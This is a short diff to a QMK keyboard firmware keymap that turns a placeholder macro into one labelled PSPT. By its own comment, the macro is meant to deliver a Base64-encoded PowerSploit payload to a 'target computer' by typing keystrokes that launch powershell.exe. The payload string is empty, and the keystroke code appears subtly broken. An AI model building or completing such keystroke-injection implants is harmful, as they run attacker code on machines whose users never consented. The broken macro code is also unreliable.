@@ -17,7 +17,7 @@
 #include "ake160886.h"
 //YOUR MACROS MUST BE ENUMERATED HERE BEFORE YOU CAN USE THEM
 enum custom_keycodes {
-    BIBL = SAFE_RANGE,
+    PSPT = SAFE_RANGE,
     QMKURL,
     MY_OTHER_MACRO,
     PS01,
@@ -79,10 +79,10 @@ bool led_update_kb(led_t led_state) {
 
 bool process_record_user(uint16_t keycode, keyrecord_t *record) {
     switch (keycode) {
-    case BIBL:
+    case PSPT:
         if (record->event.pressed) {
-            // when keycode BIBL is pressed
-            SEND_STRING("REPLACE THIS STRING WITH SOMETHING");
+            // When keycode PSPT is pressed. Powersploit is sent as a Base64 encoded string to the target computer.
+            SS_LCTRL("r")SEND_STRING("powershell.exe")SEND_STRING("");
         } else {
             // when keycode QMKBEST is released
         }
